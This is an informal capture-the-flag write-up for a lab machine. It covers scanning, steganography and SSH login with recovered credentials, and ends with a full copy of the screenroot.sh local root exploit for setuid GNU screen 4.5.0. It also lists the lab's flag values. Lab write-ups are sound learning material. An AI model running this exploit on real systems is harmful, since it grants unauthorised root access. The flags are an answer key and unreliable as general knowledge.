@@ -1,0 +1,178 @@
+we have to find 2 flags user.txt adn root.txt
+
+Please note this challenge does not require SSH brute forcing.
+
+Use your skills to access the user and root account!
+
+ip is 10.10.159.239
+nmap is our savior
+
+nmap -F 10.10.159.239
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 13:08 EDT
+Nmap scan report for 10.10.159.239
+Host is up (0.20s latency).
+Not shown: 98 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 3.42 seconds
+
+when we visited the defalut page we did get something interseting called thm.jpg and we coudnt open it tried exiftools,strings,tied to change the type but all in vain now in the end i tookmhelp from the writeups and found that we have to cehck the header as in the header it is mentioned that it is a png file but it is a jpg one insted os we google the jpg header and then edit it using ghex and in the end we will save it as another image
+
+
+
+in the image there is a dir mentioned
+which is called 
+/th1s_1s_h1dd3n
+now we will try to vist this dir
+
+
+<html>
+<head>
+  <title>Hidden Directory</title>
+  <link href="stylesheet.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+  <div class="main">
+<h2>Welcome! I have been expecting you!</h2>
+<p>To obtain my identity you need to guess my secret! </p>
+<!-- It's between 0-99 but I don't think anyone will look here-->
+
+<p>Secret Entered: </p>
+
+<p>That is wrong! Get outta here!</p>
+
+</div>
+</body>
+</html>
+
+
+in the commnet it is written that we have t guess and its b/w 0 and 99
+and we will be using the qurey like
+http://10.10.159.239/th1s_1s_h1dd3n/?secret=1
+
+now ive made a bash file for 100 of this command by getting the queries from python now the output file will be stored and then i will use the functionality callled find all and then i will remove all the ones which have error display and in the end we will get the answer
+
+
+</div>
+</body>
+</html>
+<html>
+<head>
+  <title>Hidden Directory</title>
+  <link href="stylesheet.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+  <div class="main">
+<h2>Welcome! I have been expecting you!</h2>
+<p>To obtain my identity you need to guess my secret! </p>
+<!-- It's between 0-99 but I don't think anyone will look here-->
+
+<p>Secret Entered: 73</p>
+
+<p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>
+
+</div>
+</body>
+</html>
+
+
+thus we get the user name as y2RPJ4QaPF!B
+
+now we will extract information usinf steghide and password as y2RPJ4QaPF!B
+
+we get hidden.txt
+which has
+Fine you found the password! 
+
+Here's a username 
+
+wbxre
+
+I didn't say I would make it easy for you!
+
+now we have the username and password both
+
+wbxre:y2RPJ4QaPF!B
+wbxre is in rot13
+
+
+joker:y2RPJ4QaPF!B
+
+now i downloaded the image and then again did extract the dat using steghide and without password
+we get a password.txt
+
+
+cat password.txt 
+I didn't think you'd find me! Congratulations!
+
+Here take my password
+
+*axA&GF8dP
+
+
+now after this we can try to login using
+
+joker:*axA&GF8dP
+ssh using this
+and boom we are in using this
+
+
+cat user.txt 
+THM{d5781e53b130efe2f94f9b0354a5e4ea}
+
+
+we will be using this exploit to get the flag
+
+#!/bin/bash
+# screenroot.sh
+# setuid screen v4.5.0 local root exploit
+# abuses ld.so.preload overwriting to get root.
+# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
+# HACK THE PLANET
+# ~ infodox (25/1/2017) 
+echo "~ gnu/screenroot ~"
+echo "[+] First, we create our shell and library..."
+cat << EOF >  /tmp/libhax.c
+#include<stdio.h> 
+#include<sys/types.h>
+#include<unistd.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rm -f /tmp/libhax.c
+cat  << EOF >/tmp/rootshell.c
+#include<stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+EOF
+gcc -o /tmp/rootshell /tmp/rootshell.c
+rm -f /tmp/rootshell.c
+echo "[+] Now we create our /etc/ld.so.preload file..."
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
+echo "[+] Triggering..."
+screen -ls # screen itself is setuid, so... 
+/tmp/rootshell
+
+
+
+
+
+
+cat root.txt
+THM{5ecd98aa66a6abb670184d7547c8124a}
+
